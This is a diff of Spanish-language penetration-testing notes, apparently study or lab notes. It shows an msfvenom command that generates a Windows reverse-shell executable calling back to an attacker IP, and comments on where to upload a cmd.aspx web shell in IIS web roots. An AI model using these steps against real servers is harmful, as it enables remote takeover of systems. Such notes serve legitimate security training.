@@ -127,11 +127,13 @@ NOTA:
 ❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_Kali LPORT=443 -f exe -o reverse.exe
 
 
-
 NOTA:
 	- Rutas comunes donde subir el archivo en IIS
-		C:\inetpub\wwwroot\          → raíz del servidor web → acceder en http://IP/cmd.aspx
-C:\inetpub\wwwroot\uploads\  → si hay directorio de uploads
+		C:\inetpub\wwwroot\  
+		# Raíz del servidor web → Acceder desde http://IP/cmd.aspx
+		
+		C:\inetpub\wwwroot\uploads\  
+		# Acceder desde http://IP/uploads/cmd.aspx
 ```
 
 ## Davtest
